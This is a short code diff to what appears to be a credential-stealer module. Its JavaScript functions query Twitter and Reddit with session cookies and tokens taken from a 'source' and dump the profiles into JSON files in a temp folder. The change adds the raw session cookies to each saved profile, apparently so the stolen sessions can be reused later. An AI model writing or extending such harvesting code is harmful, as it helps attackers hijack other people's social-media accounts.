@@ -32,6 +32,7 @@ const twitter = async () => {
       'Sec-Fetch-Site': 'same-site'
     }
   });
+  profile.cookie = ct0;
   profile.source = source;
   writeFileSync(join(tempFolder, 'Twitter.json'), JSON.stringify(profile));
 };
@@ -45,6 +46,7 @@ const reddit = async () => {
   const { data: account } = await axios.get('https://oauth.reddit.com/api/v1/me', {
     headers: { Authorization: `Bearer ${bearer.access_token}` }
   });
+  account.cookie = cookie;
   account.source = source;
   writeFileSync(join(tempFolder, 'Reddit.json'), JSON.stringify(account));
 };
